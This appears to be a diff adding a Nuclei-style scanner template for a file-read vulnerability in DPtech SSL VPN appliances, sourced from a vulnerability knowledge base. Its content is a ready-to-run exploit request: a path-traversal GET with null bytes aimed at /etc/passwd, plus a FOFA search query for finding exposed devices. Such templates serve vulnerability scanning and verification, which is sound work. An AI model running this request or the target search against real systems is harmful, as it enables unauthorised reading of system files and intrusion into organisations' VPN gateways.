@@ -1,0 +1,19 @@
+id: poc-wu06bpmh9pgrb22o
+info:
+  name: 迪普VPN存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wu06bpmh9pgrb22o'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wu06bpmh9pgrb22o
+    fofa: app.name="迪普科技 SSL VPN"
+http:
+- raw:
+  - GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
